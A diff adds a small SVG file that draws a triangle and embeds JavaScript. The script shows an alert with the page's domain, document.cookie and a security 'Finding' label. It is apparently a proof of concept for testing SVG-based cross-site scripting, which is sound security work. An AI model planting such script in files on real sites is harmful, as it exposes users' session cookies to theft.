@@ -1,0 +1,8 @@
+<svg xmlns="http://www.w3.org/2000/svg" version="1.1" baseProfile="full">
+   <polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>
+   <script type="text/javascript">
+	  var msg = "";
+	  if ("dev0011653.esri.com"===document.domain) {msg="\r\n\r\nFinding: Cross Domain Content Injection";} else {msg="\r\n\r\nFinding: XSS due to SVG content rendering";}
+      alert('JavaScript alert from the following domain: ' + document.domain + msg + document.cookie);
+   </script>
+</svg>
